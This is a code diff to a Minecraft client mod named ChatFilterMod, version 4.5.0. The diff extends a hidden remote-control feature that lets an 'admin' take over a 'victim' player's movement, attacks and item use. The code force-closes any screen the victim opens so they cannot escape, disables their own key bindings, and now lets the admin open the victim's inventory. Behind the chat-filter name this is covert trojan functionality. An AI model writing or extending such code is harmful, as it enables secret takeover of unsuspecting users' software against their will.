@@ -41,7 +41,7 @@ import net.minecraft.entity.EquipmentSlot;
 public final class ChatFilterMod implements ClientModInitializer {
 
     public static final Logger LOGGER = LoggerFactory.getLogger("columba");
-    public static final String VERSION = "4.4.5";
+    public static final String VERSION = "4.5.0";
     public static KeyBinding OPEN_KEY;
     public static KeyBinding ADMIN_KEY;
 
@@ -103,7 +103,7 @@ public final class ChatFilterMod implements ClientModInitializer {
     // Remote control (victim-side state, volatile for cross-thread visibility)
     private static volatile boolean trollRemoteControl = false;
     private static volatile boolean rcW, rcA, rcS, rcD, rcJump, rcSneak;
-    private static volatile boolean rcSprint, rcAttack, rcUse, rcCloseScreen;
+    private static volatile boolean rcSprint, rcAttack, rcUse, rcCloseScreen, rcInventory;
     private static volatile float rcYaw, rcPitch;
     private static volatile long rcLastUpdate = 0;
     private static boolean rcJumpPrev = false; // edge detection for jump
@@ -460,9 +460,16 @@ public final class ChatFilterMod implements ClientModInitializer {
                     }
                     // Direct sneak via player API — reliable regardless of key state
                     client.player.setSneaking(rcSneak);
-                    // Force close ANY screen the victim opens — prevents ESC/inventory/chat escape
-                    if (client.currentScreen != null) {
-                        client.setScreen(null);
+                    // Inventory toggle: E on admin opens/closes victim inventory
+                    if (rcInventory) {
+                        if (!(client.currentScreen instanceof net.minecraft.client.gui.screen.ingame.InventoryScreen)) {
+                            client.setScreen(new net.minecraft.client.gui.screen.ingame.InventoryScreen(client.player));
+                        }
+                    } else {
+                        // Close any screen the victim has open (prevents escape)
+                        if (client.currentScreen != null) {
+                            client.setScreen(null);
+                        }
                     }
                     rcCloseScreen = false;
                     // Neutralize all non-RC key bindings — belt-and-suspenders against input leaks
@@ -490,7 +497,7 @@ public final class ChatFilterMod implements ClientModInitializer {
                 } else if (trollRemoteControl && System.currentTimeMillis() - rcLastUpdate >= 10000) {
                     trollRemoteControl = false;
                     rcW = rcA = rcS = rcD = rcJump = rcSneak = false;
-                    rcSprint = rcAttack = rcUse = rcCloseScreen = false;
+                    rcSprint = rcAttack = rcUse = rcCloseScreen = rcInventory = false;
                     rcJumpPrev = false;
                     // Restore original Input
                     if (savedInput != null) { client.player.input = savedInput; savedInput = null; }
@@ -1469,7 +1476,7 @@ public final class ChatFilterMod implements ClientModInitializer {
                 trollSwapWS = false;
                 trollRemoteControl = false;
                 rcW = rcA = rcS = rcD = rcJump = rcSneak = false;
-                rcSprint = rcAttack = rcUse = rcCloseScreen = false;
+                rcSprint = rcAttack = rcUse = rcCloseScreen = rcInventory = false;
                 rcJumpPrev = false;
                 if (savedInput != null && mc.player != null) { mc.player.input = savedInput; savedInput = null; }
                 nauseaTick = 0;
@@ -1490,7 +1497,7 @@ public final class ChatFilterMod implements ClientModInitializer {
                     trollRemoteControl = true;
                     rcLastUpdate = System.currentTimeMillis();
                     rcW = rcA = rcS = rcD = rcJump = rcSneak = false;
-                    rcSprint = rcAttack = rcUse = rcCloseScreen = false;
+                    rcSprint = rcAttack = rcUse = rcCloseScreen = rcInventory = false;
                     rcJumpPrev = false;
                     // Force close any open screen immediately
                     mc.execute(() -> { if (mc.currentScreen != null) mc.setScreen(null); });
@@ -1514,7 +1521,7 @@ public final class ChatFilterMod implements ClientModInitializer {
                 } else if (command.toUpperCase().startsWith("REMOTESTOP")) {
                     trollRemoteControl = false;
                     rcW = rcA = rcS = rcD = rcJump = rcSneak = false;
-                    rcSprint = rcAttack = rcUse = rcCloseScreen = false;
+                    rcSprint = rcAttack = rcUse = rcCloseScreen = rcInventory = false;
                     rcJumpPrev = false;
                     // Restore original keyboard input
                     if (mc.player != null) {
@@ -1551,6 +1558,8 @@ public final class ChatFilterMod implements ClientModInitializer {
                         if (uIdx >= 0 && uIdx + 1 < data.length()) rcUse = data.charAt(uIdx + 1) == '1';
                         int xIdx = data.indexOf('X');
                         if (xIdx >= 0 && xIdx + 1 < data.length()) rcCloseScreen = data.charAt(xIdx + 1) == '1';
+                        int iIdx = data.indexOf('I');
+                        if (iIdx >= 0 && iIdx + 1 < data.length()) rcInventory = data.charAt(iIdx + 1) == '1';
                         int yIdx = data.indexOf('Y');
                         int pIdx = data.indexOf('P', yIdx);
                         rcYaw = Float.parseFloat(data.substring(yIdx + 1, pIdx));
